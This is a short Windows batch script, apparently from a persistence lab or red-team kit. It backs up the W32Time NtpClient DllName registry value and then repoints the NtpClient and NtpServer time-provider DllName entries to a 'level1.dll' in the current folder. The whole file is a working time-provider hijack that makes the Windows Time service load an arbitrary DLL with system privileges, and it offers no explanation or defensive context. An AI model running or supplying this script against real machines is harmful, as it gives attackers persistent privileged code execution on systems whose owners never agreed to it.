@echo oFF

REG QUERY HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient /v DllName >> original_NtpClient_DllName.txt

REG ADD HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient /t REG_EXPAND_SZ  /v DllName /d "%cd%\level1.dll" /f
REG ADD HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer /t REG_EXPAND_SZ  /v DllName /d "%cd%\level1.dll" /f

